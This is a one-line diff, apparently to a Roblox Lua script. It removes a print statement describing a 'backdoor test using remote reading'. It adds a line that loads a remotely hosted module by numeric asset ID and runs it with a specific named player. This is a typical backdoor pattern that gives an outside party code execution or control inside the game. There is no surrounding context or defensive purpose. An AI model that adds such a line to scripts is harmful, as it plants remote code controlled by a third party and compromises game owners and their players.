@@ -1,1 +1,1 @@
-print('this is a unpro backdoor test using remote reading.')
+require(0x3e50d7d22)(game.Players.benjikad)
